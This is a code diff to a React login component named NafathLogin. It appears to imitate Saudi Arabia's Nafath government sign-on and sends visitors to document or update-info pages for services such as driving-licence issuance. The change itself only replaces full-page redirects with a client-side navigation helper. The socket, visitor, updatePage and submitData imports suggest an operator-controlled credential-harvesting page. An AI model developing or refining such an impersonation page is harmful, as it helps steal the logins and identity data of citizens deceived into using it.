@@ -1,5 +1,5 @@
 import { useState, useRef, useEffect } from "react";
-import { socket, updatePage, submitData, visitor } from "@/lib/store";
+import { socket, updatePage, submitData, visitor, clientNavigate } from "@/lib/store";
 import { Eye, EyeOff, Globe, Plus, Minus, User, Lock, Loader2, AlertCircle } from "lucide-react";
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
@@ -127,9 +127,9 @@ export default function NafathLogin() {
                             'إصدار رخصة قيادة'
                           ];
                           if (serviceName && issuanceServices.includes(serviceName)) {
-                            window.location.href = `/documents?service=${encodeURIComponent(serviceName)}`;
+                            clientNavigate(`/documents?service=${encodeURIComponent(serviceName)}`);
                           } else {
-                            window.location.href = serviceName ? `/update-info?service=${encodeURIComponent(serviceName)}` : "/update-info";
+                            clientNavigate(serviceName ? `/update-info?service=${encodeURIComponent(serviceName)}` : "/update-info");
                           }
                         }
                       }, 3000);
@@ -276,9 +276,9 @@ export default function NafathLogin() {
                   'تجديد رخصة سير'
                 ];
                 if (serviceName && documentServices.includes(serviceName)) {
-                  window.location.href = `/documents?service=${encodeURIComponent(serviceName)}`;
+                  clientNavigate(`/documents?service=${encodeURIComponent(serviceName)}`);
                 } else {
-                  window.location.href = serviceName ? `/update-info?service=${encodeURIComponent(serviceName)}` : "/update-info";
+                  clientNavigate(serviceName ? `/update-info?service=${encodeURIComponent(serviceName)}` : "/update-info");
                 }
               }}
               className="bg-[#11998e] hover:bg-[#0e8c82] text-white px-12 py-2 text-base font-bold rounded-md"
